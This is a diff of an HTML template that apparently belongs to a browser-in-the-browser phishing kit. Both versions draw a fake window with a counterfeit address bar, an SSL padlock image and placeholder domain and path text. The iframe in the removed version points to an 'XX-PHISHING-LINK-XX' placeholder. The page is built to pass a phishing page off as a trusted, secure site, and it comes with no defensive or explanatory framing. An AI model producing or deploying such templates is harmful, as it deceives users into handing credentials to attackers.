@@ -1,37 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<meta charset="utf-8">
+	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="./style.css">
+	<title>Fake Site</title>
+	<link rel="icon" type="image/x-icon" href="./favicon.ico">
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
 <body>
-<div id="window">
-<!-- Title bar start -->
-<div id="title-bar-width">
-	<div id="title-bar">
-		<div style="margin-top:5px;">
-			<img src="./logo.svg" width="20px" height="15px" id="logo">
-			<span id="logo-description">XX-TITLE-XX</span>
-		</div>
 
-		<div>
-			<span id="minimize">&#8212;</span>
-			<span id="square">□</span>
-			<span id="exit">✕</span>
+<div id="main-window">
+	<div id="title-width">
+		<div id="address-bar">
+			<img src="./lockicon.svg" width="20px" height="20px" id="padlock-icon">
+			<span id="domain-name">XX-DOMAIN_NAME-XX</span>
+			<span id="domain-path">XX-DOMAIN-PATH-XX</span>
 		</div>
 	</div>
-	<div id="url-bar">
-		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
-		<span id="domain-name">XX-DOMAIN-NAME-XX</span>
-		<span id="domain-path">XX-DOMAIN-PATH-XX</span>
-	</div>
+	<iframe id="frame-content" src="https://" frameBorder="0" sandbox="allow-top-navigation allow-scripts"></iframe>
 </div>
-<!-- Content start -->
-<iframe id="content" src="XX-PHISHING-LINK-XX" frameBorder="0"></iframe>
-</div>
+
 </body>
-<script src="script.js"></script>
 </html>
-
